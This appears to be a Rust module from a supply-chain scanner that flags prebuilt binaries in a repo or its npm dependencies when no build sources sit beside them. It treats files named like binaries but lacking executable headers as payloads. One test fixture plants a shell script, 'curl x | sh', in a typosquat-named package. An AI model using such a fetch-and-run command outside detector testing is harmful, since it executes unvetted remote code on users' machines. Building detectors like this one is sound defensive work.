//! Prebuilt binaries (`.node`, `.wasm`, `.so`, `.dylib`, `.dll`, `.exe`)
//! with nothing to build them from: committed to the repo's own tree, or
//! shipped by an npm dependency. You run what was uploaded, so they warn;
//! a file named like a binary whose first bytes are not an executable or
//! WebAssembly header is a payload, and fails. Well-known native
//! publishers (build tools, image, database and crypto bindings) are
//! skipped.

use super::{Policy, Suspect, apply_policy};
use std::path::{Path, PathBuf};

const BLOB_EXTS: &[&str] = &["node", "wasm", "so", "dylib", "dll", "exe"];
/// Files that could have produced a binary.
const BUILD_FILES: &[&str] = &[
    "binding.gyp",
    "cmakelists.txt",
    "cargo.toml",
    "build.rs",
    "makefile",
    "meson.build",
    "configure",
    "build.zig",
    "go.mod",
    "package.swift",
];
const SOURCE_EXTS: &[&str] = &["c", "cc", "cpp", "cxx", "rs", "wat", "zig", "go", "m", "mm", "asm", "s", "swift"];
const MACH_O: [[u8; 4]; 6] = [
    [0xfe, 0xed, 0xfa, 0xce],
    [0xce, 0xfa, 0xed, 0xfe],
    [0xfe, 0xed, 0xfa, 0xcf],
    [0xcf, 0xfa, 0xed, 0xfe],
    [0xca, 0xfe, 0xba, 0xbe],
    [0xbe, 0xba, 0xfe, 0xca],
];
/// GNU ld scripts are text and legitimately named `.so`.
const LD_SCRIPT: &[&[u8]] = &[b"/*", b"INPUT", b"GROUP"];

/// How much of a file says what it is, and the least that says anything.
const HEAD: usize = 8;
const MIN_HEAD: usize = 4;
/// How many names a finding lists.
const SHOWN: usize = 3;
/// How deep a package is read, how many of its files, and how many packages.
const PACKAGE_DEPTH: usize = 4;
const MAX_PACKAGE_FILES: usize = 20_000;
const MAX_PACKAGES: usize = 5000;

/// Publishers whose packages are prebuilt N-API or WebAssembly binaries
/// by design: the usual build tools, image, database and crypto bindings.
/// A trailing `*` matches a prefix.
const KNOWN_NATIVE: &[&str] = &[
    "fsevents",
    "esbuild",
    "esbuild-*",
    "@esbuild/*",
    "sharp",
    "@img/*",
    "@swc/*",
    "@parcel/*",
    "@rollup/rollup-*",
    "@biomejs/*",
    "next",
    "@next/swc-*",
    "turbo",
    "turbo-*",
    "lightningcss",
    "lightningcss-*",
    "@tailwindcss/oxide*",
    "@node-rs/*",
    "@napi-rs/*",
    "@oxc-*",
    "@unrs/*",
    "@rspack/*",
    "@rsbuild/*",
    "@farmfe/*",
    "node-pty",
    "bufferutil",
    "utf-8-validate",
    "cpu-features",
    "ssh2",
    "sqlite3",
    "better-sqlite3",
    "sql.js",
    "@libsql/*",
    "libsql",
    "@duckdb/*",
    "duckdb",
    "canvas",
    "prisma",
    "@prisma/*",
    "onnxruntime-node",
    "onnxruntime-web",
    "@tensorflow/*",
    "bcrypt",
    "argon2",
    "node-sass",
    "sass-embedded",
    "sass-embedded-*",
    "@sentry/*",
    "@datadog/*",
    "dd-trace",
    "re2",
    "leveldown",
    "classic-level",
    "lmdb",
    "@lmdb/*",
    "msgpackr-extract",
    "@msgpackr-extract/*",
    "node-gyp",
    "@mapbox/node-pre-gyp",
    "nx",
    "@nx/*",
    "puppeteer",
    "@puppeteer/*",
    "electron",
    "@electron/*",
    "keytar",
    "usb",
    "serialport",
    "@serialport/*",
    "node-hid",
    "@vercel/*",
    "@cloudflare/*",
    "workerd",
    "wrangler",
    "@pnpm/*",
    "@yarnpkg/*",
    "zeromq",
    "sodium-native",
    "libsodium-wrappers",
    "libsodium-wrappers-sumo",
    "tiny-secp256k1",
    "secp256k1",
    "keccak",
    "web-tree-sitter",
    "tree-sitter",
    "tree-sitter-*",
    "tiktoken",
    "@dqbd/tiktoken",
    "@anthropic-ai/*",
    "@emnapi/*",
    "@ffmpeg/*",
    "ffmpeg-static",
    "@ffmpeg-installer/*",
    "@tauri-apps/*",
    "@resvg/*",
    "@shikijs/*",
    "shiki",
    "wasm-*",
];

fn blob_ext(name: &str) -> Option<&'static str> {
    let l = name.to_ascii_lowercase();
    if l.contains(".so.") {
        return Some("so");
    }
    let ext = l.rsplit_once('.').map(|(_, e)| e).unwrap_or("");
    BLOB_EXTS.iter().copied().find(|e| *e == ext)
}

pub(super) fn is_blob_name(name: &str) -> bool {
    blob_ext(name).is_some()
}

/// Something a binary could have been built from.
pub(super) fn native_source_name(name: &str) -> bool {
    let l = name.to_ascii_lowercase();
    BUILD_FILES.contains(&l.as_str()) || SOURCE_EXTS.contains(&l.rsplit_once('.').map(|(_, e)| e).unwrap_or(""))
}

/// Why a file named like a binary isn't one: its first bytes are not an
/// executable or WebAssembly header. `None` when they are, or the file is
/// too short to say.
fn wrong_magic(path: &Path) -> Option<String> {
    use std::io::Read;
    let name = path.file_name()?.to_string_lossy().to_ascii_lowercase();
    let ext = blob_ext(&name)?;
    let mut head = [0u8; HEAD];
    let n = std::fs::File::open(path).ok()?.read(&mut head).ok()?;
    if n < MIN_HEAD {
        return None;
    }
    let head = &head[..n];
    let ok = if ext == "wasm" {
        head.starts_with(b"\0asm")
    } else {
        head.starts_with(b"\x7fELF")
            || head.starts_with(b"MZ")
            || MACH_O.iter().any(|m| head.starts_with(m))
            || (ext == "so" && LD_SCRIPT.iter().any(|s| head.starts_with(s)))
    };
    if ok {
        None
    } else {
        let hex: Vec<String> = head.iter().take(MIN_HEAD).map(|b| format!("{b:02x}")).collect();
        Some(format!("`{name}` starts with {} rather than an executable header", hex.join(" ")))
    }
}

/// Binaries with nothing to build them from (`verb`: "commits" for the
/// repo's own tree, "ships" for a dependency); one that isn't a binary at
/// all fails.
pub(super) fn findings(blobs: &[(String, PathBuf)], sources: bool, verb: &str) -> Vec<Suspect> {
    let mut out = Vec::new();
    for (rel, path) in blobs {
        if let Some(why) = wrong_magic(path) {
            out.push(Suspect {
                file: rel.clone(),
                id: "SUSPECT-BINARY-BLOB",
                line: 0,
                note: format!("{why}: a file named like a binary that isn't one is a payload"),
                hard: true,
            });
        }
    }
    if !sources && !blobs.is_empty() && out.is_empty() {
        let names: Vec<&str> = blobs.iter().take(SHOWN).map(|(r, _)| r.rsplit('/').next().unwrap_or(r)).collect();
        let n = blobs.len();
        out.push(Suspect {
            file: blobs[0].0.clone(),
            id: "SUSPECT-BINARY-BLOB",
            line: 0,
            note: format!(
                "{verb} {n} prebuilt binar{} ({}{}) with no source to build {} from: you run what was uploaded",
                if n == 1 { "y" } else { "ies" },
                names.join(", "),
                if n > SHOWN { ", …" } else { "" },
                if n == 1 { "it" } else { "them" }
            ),
            hard: false,
        });
    }
    out
}

/// Every file in a package, `PACKAGE_DEPTH` levels deep, skipping nested packages.
fn package_files(dir: &Path, level: usize, out: &mut Vec<PathBuf>) {
    let Ok(rd) = std::fs::read_dir(dir) else { return };
    let mut entries: Vec<_> = rd.filter_map(|e| e.ok()).collect();
    entries.sort_by_key(|e| e.file_name());
    for e in entries {
        let Ok(t) = e.file_type() else { continue };
        let name = e.file_name().to_string_lossy().into_owned();
        if t.is_dir() {
            if level < PACKAGE_DEPTH && name != "node_modules" && name != ".git" {
                package_files(&e.path(), level + 1, out);
            }
        } else if t.is_file() && out.len() < MAX_PACKAGE_FILES {
            out.push(e.path());
        }
    }
}

fn known_native(pkg: &str) -> bool {
    KNOWN_NATIVE.iter().any(|k| match k.strip_suffix('*') {
        Some(prefix) => pkg.starts_with(prefix),
        None => pkg == *k,
    })
}

/// The package directories under `node_modules`: `*` and `@*/*`.
fn packages(nm: &Path) -> Vec<PathBuf> {
    let mut pkgs: Vec<PathBuf> = Vec::new();
    let Ok(rd) = std::fs::read_dir(nm) else { return pkgs };
    for e in rd.filter_map(|e| e.ok()) {
        let p = e.path();
        let name = e.file_name().to_string_lossy().into_owned();
        if name.starts_with('.') || !p.is_dir() {
            continue;
        }
        if name.starts_with('@') {
            if let Ok(rd2) = std::fs::read_dir(&p) {
                pkgs.extend(rd2.filter_map(|e| e.ok()).map(|e| e.path()).filter(|p| p.is_dir()));
            }
        } else {
            pkgs.push(p);
        }
    }
    pkgs.sort();
    pkgs
}

/// Native and WebAssembly binaries the repo's npm dependencies ship with
/// nothing to build them from (`node_modules/*`, `node_modules/@*/*`), after
/// the policy. Well-known native publishers are skipped; a file named like
/// a binary that isn't one fails.
pub fn dependency_blobs(root: &Path, policy: &Policy) -> Vec<Suspect> {
    let mut out = Vec::new();
    let nm = root.join("node_modules");
    for pkg in packages(&nm).iter().take(MAX_PACKAGES) {
        let pkg_name = pkg.strip_prefix(&nm).unwrap_or(pkg).to_string_lossy().replace('\\', "/");
        if known_native(&pkg_name) {
            continue;
        }
        // Not repos::walk: prebuilt binaries live in `build/`, `prebuilds/` and
        // `dist/`, which it prunes as output.
        let mut files = Vec::new();
        package_files(pkg, 0, &mut files);
        let (mut blobs, mut sources) = (Vec::new(), false);
        for path in files {
            let f = path.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
            if is_blob_name(&f) {
                let rel = path.strip_prefix(root).unwrap_or(&path).to_string_lossy().replace('\\', "/");
                blobs.push((rel, path.clone()));
            }
            if native_source_name(&f) {
                sources = true;
            }
        }
        out.extend(findings(&blobs, sources, "ships"));
    }
    apply_policy(&mut out, policy);
    out.sort_by(|a, b| (a.file.as_str(), a.id).cmp(&(b.file.as_str(), b.id)));
    out
}

#[cfg(test)]
mod tests {
    use super::super::{Kind, ids, scan_dir};
    use super::*;

    #[test]
    fn dependencies_that_ship_binaries_without_sources() {
        let d = crate::system::TempDir::new("blobs").unwrap();
        let root = d.path();
        std::fs::create_dir_all(root.join("node_modules/lodahs/build")).unwrap();
        std::fs::create_dir_all(root.join("node_modules/@esbuild/darwin-arm64/bin")).unwrap();
        std::fs::create_dir_all(root.join("node_modules/honest/src")).unwrap();
        std::fs::write(root.join("node_modules/lodahs/build/helper.node"), b"\xcf\xfa\xed\xfe\x0c\x00\x00\x01")
            .unwrap();
        std::fs::write(root.join("node_modules/@esbuild/darwin-arm64/bin/esbuild"), b"\xcf\xfa\xed\xfe").unwrap();
        std::fs::write(root.join("node_modules/honest/src/addon.cc"), "int main(){}").unwrap();
        std::fs::write(root.join("node_modules/honest/addon.node"), b"\x7fELF\x02\x01\x01\x00").unwrap();
        let got = dependency_blobs(root, &Policy::default());
        assert_eq!(ids(&got), [("SUSPECT-BINARY-BLOB", false)], "{got:?}");
        assert!(got[0].file.starts_with("node_modules/lodahs/"), "{got:?}");
        assert!(got[0].note.contains("ships 1 prebuilt binary (helper.node)"), "{}", got[0].note);
        // A ".node" that is a script is a payload.
        std::fs::write(root.join("node_modules/lodahs/build/helper.node"), "#!/bin/sh\ncurl x | sh\n").unwrap();
        let got = dependency_blobs(root, &Policy::default());
        assert_eq!(ids(&got), [("SUSPECT-BINARY-BLOB", true)], "{got:?}");
        assert!(got[0].note.contains("starts with 23 21 2f 62"), "{}", got[0].note);
        let p = Policy::parse("BINARY-BLOB\n");
        assert!(dependency_blobs(root, &p).iter().all(|s| !s.hard), "the policy downgrades");
        assert!(
            dependency_blobs(root.join("node_modules/honest").as_path(), &p).is_empty(),
            "no node_modules: nothing"
        );
    }

    #[test]
    fn many_blobs_are_counted_and_the_first_three_named() {
        let d = crate::system::TempDir::new("blobs-many").unwrap();
        let root = d.path();
        let dir = root.join("node_modules/prebuilt/prebuilds");
        std::fs::create_dir_all(&dir).unwrap();
        for name in ["a.node", "b.dll", "c.dylib", "d.exe", "libe.so.1"] {
            std::fs::write(dir.join(name), b"MZ\x90\x00\x03\x00").unwrap();
        }
        std::fs::write(dir.join("ld.so"), "INPUT(libx.so.1)\n").unwrap();
        let got = dependency_blobs(root, &Policy::default());
        assert_eq!(ids(&got), [("SUSPECT-BINARY-BLOB", false)], "an ld script named .so is not a payload: {got:?}");
        assert!(
            got[0]
                .note
                .contains("ships 6 prebuilt binaries (a.node, b.dll, c.dylib, …) with no source to build them from"),
            "{}",
            got[0].note
        );
        std::fs::write(dir.join("short.wasm"), b"\0a").unwrap();
        assert_eq!(
            ids(&dependency_blobs(root, &Policy::default())),
            [("SUSPECT-BINARY-BLOB", false)],
            "too short to say is not a payload"
        );
        std::fs::write(dir.join("fake.wasm"), b"\x7fELF\x02\x01").unwrap();
        let got = dependency_blobs(root, &Policy::default());
        assert_eq!(ids(&got), [("SUSPECT-BINARY-BLOB", true)], "an ELF named .wasm is not WebAssembly: {got:?}");
    }

    #[test]
    fn the_repos_own_tree() {
        let d = crate::system::TempDir::new("blobs-tree").unwrap();
        let root = d.path();
        std::fs::write(root.join("engine.wasm"), b"\0asm\x01\x00\x00\x00").unwrap();
        crate::repos::forget_walks();
        let got = scan_dir(root, Kind::Repo, &Policy::default());
        assert_eq!(ids(&got), [("SUSPECT-BINARY-BLOB", false)], "{got:?}");
        assert!(got[0].note.contains("commits 1 prebuilt binary (engine.wasm)"), "{}", got[0].note);
        crate::repos::forget_walks();
        assert!(
            scan_dir(root, Kind::Installed, &Policy::default()).is_empty(),
            "installed code is expected to ship binaries"
        );
        std::fs::create_dir_all(root.join("dist")).unwrap();
        std::fs::create_dir_all(root.join("tests")).unwrap();
        std::fs::write(root.join("dist/out.wasm"), b"\0asm").unwrap();
        std::fs::write(root.join("tests/fixture.exe"), "not a program").unwrap();
        crate::repos::forget_walks();
        let got = scan_dir(root, Kind::Repo, &Policy::default());
        assert_eq!(got.len(), 1, "output and fixtures are not the tree: {got:?}");
        std::fs::write(root.join("Cargo.toml"), "[package]\n").unwrap();
        crate::repos::forget_walks();
        assert!(scan_dir(root, Kind::Repo, &Policy::default()).is_empty(), "with sources it is nothing");
        std::fs::write(root.join("helper.node"), "#!/bin/sh\n").unwrap();
        crate::repos::forget_walks();
        assert_eq!(
            ids(&scan_dir(root, Kind::Repo, &Policy::default())),
            [("SUSPECT-BINARY-BLOB", true)],
            "a payload fails even beside sources"
        );
    }

    #[test]
    fn names_and_publishers() {
        assert!(is_blob_name("x.NODE") && is_blob_name("libz.so.1.2") && is_blob_name("a.dylib"));
        assert!(!is_blob_name("x.js") && !is_blob_name("notes.soon") && !is_blob_name("node"));
        assert!(
            native_source_name("binding.gyp") && native_source_name("CMakeLists.txt") && native_source_name("a.cc")
        );
        assert!(!native_source_name("index.js") && !native_source_name("README.md"));
        assert!(known_native("@esbuild/darwin-arm64") && known_native("sharp") && known_native("wasm-pack"));
        assert!(!known_native("sharpe") && !known_native("@esbuild") && !known_native("lodahs"));
    }
}
